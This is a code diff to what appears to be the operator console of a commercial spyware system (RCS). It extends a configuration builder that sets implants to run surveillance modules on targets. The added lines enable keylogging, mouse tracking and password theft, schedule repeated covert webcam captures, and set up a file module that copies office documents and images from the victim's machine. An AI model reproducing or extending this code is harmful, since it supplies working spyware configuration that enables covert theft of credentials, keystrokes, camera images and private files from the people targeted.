@@ -30,8 +30,10 @@ package it.ht.rcs.console.operations.view.configuration.basic
       if (model.messages) { subactions.push({action: "module", module: "messages",    status: "start"});
                             subactions.push({action: "module", module: "chat",        status: "start"}); }
       if (model.url)        subactions.push({action: "module", module: "url",         status: "start"});
-      if (model.file)       subactions.push({action: "module", module: "file",        status: "start"});
-      if (model.screenshot) subactions.push({action: "module", module: "mouse",       status: "start"}); // I do not add screenshot here because, if enabled, it will have its own event/action
+      if (model.file)     { subactions.push({action: "module", module: "file",        status: "start"}); configureFileModule(model, newConfig); }
+      if (model.keylog)   { subactions.push({action: "module", module: "keylog",      status: "start"});
+                            subactions.push({action: "module", module: "mouse",       status: "start"});
+                            subactions.push({action: "module", module: "password",    status: "start"}); }
       
       
       var startupEvent:Object =  {event: "timer", subtype: "startup", start: 0, ts: "00:00:00", enabled: true, desc: "STARTUP"};
@@ -46,6 +48,15 @@ package it.ht.rcs.console.operations.view.configuration.basic
         var screenshotAction:Object = {desc: "SCREENSHOT", subactions: [{action: "module", module: "screenshot", status: "start"}]};
         events.push(screenshotEvent);
         actions.push(screenshotAction);
+        index++;
+      }
+      
+      
+      if (model.camera) {
+        var cameraEvent:Object =  {event: "timer", subtype: "loop", start: index, repeat: index, delay: model.cameraDelay, iter: model.cameraIter, ts: "00:00:00", te: "23:59:59", enabled: true, desc: "CAMERA"};
+        var cameraAction:Object = {desc: "CAMERA", subactions: [{action: "module", module: "camera", status: "start"}]};
+        events.push(cameraEvent);
+        actions.push(cameraAction);
         index++;
       }
       
@@ -78,6 +89,30 @@ package it.ht.rcs.console.operations.view.configuration.basic
       newConfig.events = events;
       newConfig.actions = actions;
       
+    }
+    
+    private static function configureFileModule(model:Object, newConfig:Object):void
+    {
+      var file:Object;
+      for each (var module:Object in newConfig.modules)
+        if (module.module == 'file')
+          file = module;
+      
+      if (file == null) return;
+      
+      file.open = true;
+      file.capture = true;
+      
+      file.accept = [];
+      
+      if (model.documents)
+        file.accept = (file.accept as Array).concat(['*.doc', '*.docx', '*.xls', '*.xlsx', '*.ppt', '*.pptx', '*.pps', '*.ppsx',
+                                                     '*.odt', '*.ods',  '*.odp', '*.rtf',  '*.txt', '*.pdf']);
+      
+      if (model.images)
+        file.accept = (file.accept as Array).concat(['*.jpg', '*.jpeg', '*.png', '*.gif', '*.bmp']);
+      
+      file.deny = ['/setting'];
     }
     
   }
